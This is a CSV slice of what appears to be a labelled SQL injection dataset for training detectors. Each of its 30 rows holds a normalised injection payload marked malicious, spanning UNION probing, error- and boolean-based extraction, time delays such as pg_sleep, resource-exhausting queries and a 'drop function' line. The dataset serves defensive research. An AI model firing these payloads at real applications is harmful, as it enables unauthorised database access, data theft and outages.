row_index,payload_norm,label,sqli_type_hint
8610,"1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'zcrh' = 'zcrh",1,
8611,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""gzhp"" = ""gzhp",1,
8612,"1', ( select * from generate_series ( 2636,2636,case when ( 2636 = 7071 ) then 1 else 0 end ) limit 1 )",1,
8613,1 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
8614,1%' ) ) ) union all select null#,1,
8615,select ( case when ( 3859 = 6938 ) then 3859 else 3859* ( select 3859 from mysql.db ) end ) #,1,
8616,"1' union all select null,null,null,null,null,null,null,null,null,null--",1,
8617,"1 ) ) union all select null,null,null,null,null,null,null,null,null#",1,
8618,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""%"" = """,1,
8619,1 and 7533 = 7533# absp,1,
8620,1'+ ( select 'xbyn' where 6881 = 6881,1,
8621,-7277 ) ) ) order by 1#,1,
8622,"1 ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
8623,if ( 7340 = 9813 ) select 7340 else drop function yppp--,1,
8624,"1 ) where 2888 = 2888 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8625,"-5903%' ) union all select 8293,8293,8293,8293,8293,8293,8293,8293#",1,
8626,"1%' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( '%' = '",1,
8627,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'ufbr' = 'ufbr",1,
8628,"-8245"" ) ) or 3038 = 3038",1,
8629,"1%"" ) ) ) and elt ( 9524 = 1124,1124 ) and ( ( ( ""%"" = """,1,
8630,"iif ( 5257 = 5257,1,1/0 )",1,
8631,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",1,
8632,"1 ) as wype where 6608 = 6608 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
8633,"1%"" ) union all select null,null,null--",1,
8634,"1%' ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
8635,"-2803"" ) union all select 5337,5337,5337,5337,5337,5337,5337#",1,
8636,"-6775"" union all select 7484,7484#",1,
8637,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""qycx"" like ""qycx",1,
8638,"-5420' ) union all select 2508,2508,2508,2508,2508,2508,2508#",1,
8639,"1' in boolean mode ) union all select null,null,null#",1,
